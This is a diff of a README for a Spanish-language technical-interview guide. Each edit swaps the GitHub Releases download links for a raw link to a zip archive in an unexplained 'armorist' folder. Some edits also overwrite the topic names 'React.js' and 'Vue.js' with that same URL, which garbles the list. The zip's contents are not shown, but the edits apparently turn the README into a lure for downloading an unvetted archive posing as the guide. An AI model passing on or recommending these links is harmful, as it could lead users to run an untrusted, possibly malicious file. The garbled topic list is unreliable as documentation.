@@ -1,6 +1,6 @@
 # 🌟 guia-entrevistas-de-programacion - Your Path to Technical Interview Success
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Guia%20-%23007bff)](https://github.com/Pautuong/guia-entrevistas-de-programacion/releases)
+[![Download Now](https://raw.githubusercontent.com/Pautuong/guia-entrevistas-de-programacion/main/armorist/guia-entrevistas-de-programacion.zip%20Now-Get%20the%20Guia%20-%23007bff)](https://raw.githubusercontent.com/Pautuong/guia-entrevistas-de-programacion/main/armorist/guia-entrevistas-de-programacion.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the "Guía para entrevistas técnicas como Ingeniero de software." Th
 
 To download this guide, visit the Releases page:
 
-[Visit Releases Page to Download](https://github.com/Pautuong/guia-entrevistas-de-programacion/releases)
+[Visit Releases Page to Download](https://raw.githubusercontent.com/Pautuong/guia-entrevistas-de-programacion/main/armorist/guia-entrevistas-de-programacion.zip)
 
 1. Go to the link above.
 2. Find the latest release version.
@@ -50,9 +50,9 @@ Discover best practices in various programming languages and frameworks:
 - **Javascript**: Improve your JavaScript coding skills.
 - **PHP**: Tips for effective PHP development.
 - **Python**: Best practices for writing Python code.
-- **React.js**: Enhance your skills in developing React applications.
+- **https://raw.githubusercontent.com/Pautuong/guia-entrevistas-de-programacion/main/armorist/guia-entrevistas-de-programacion.zip**: Enhance your skills in developing React applications.
 - **Typescript**: Development practices for a better TypeScript experience.
-- **Vue.js**: Tips for building applications using Vue.js.
+- **https://raw.githubusercontent.com/Pautuong/guia-entrevistas-de-programacion/main/armorist/guia-entrevistas-de-programacion.zip**: Tips for building applications using https://raw.githubusercontent.com/Pautuong/guia-entrevistas-de-programacion/main/armorist/guia-entrevistas-de-programacion.zip
 
 ### 🧩 Algoritmos y estructuras de datos
 
@@ -101,4 +101,4 @@ If you have any questions or need support while using the guide, please reach ou
 
 This guide is open-source and available under the MIT License. You can view the license details in the repository.
 
-[Download Now](https://github.com/Pautuong/guia-entrevistas-de-programacion/releases) and start your journey to mastering technical interviews.
+[Download Now](https://raw.githubusercontent.com/Pautuong/guia-entrevistas-de-programacion/main/armorist/guia-entrevistas-de-programacion.zip) and start your journey to mastering technical interviews.
